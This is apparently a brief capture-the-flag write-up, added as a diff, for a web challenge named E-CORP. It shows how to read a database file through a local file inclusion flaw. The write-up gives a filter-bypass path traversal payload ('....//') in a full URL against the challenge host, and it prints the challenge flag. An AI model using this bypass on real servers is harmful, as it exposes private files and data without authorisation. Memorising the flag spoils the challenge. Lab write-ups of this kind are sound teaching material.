@@ -1,0 +1,18 @@
+first open 
+
+http://3.121.98.79/E-CORP/robots.txt
+
+now open readme.md
+
+you will find the source code 
+
+now you will see that you need to read /../database/E-Corp.db
+
+
+to bypass the lfi filter you will double every thing 
+
+so ./ => ....//
+
+now open http://3.121.98.79/E-CORP/?page=....//database/E-Corp.db
+
+you will find the flag flag{LFI_l00k5_s0_c00l}
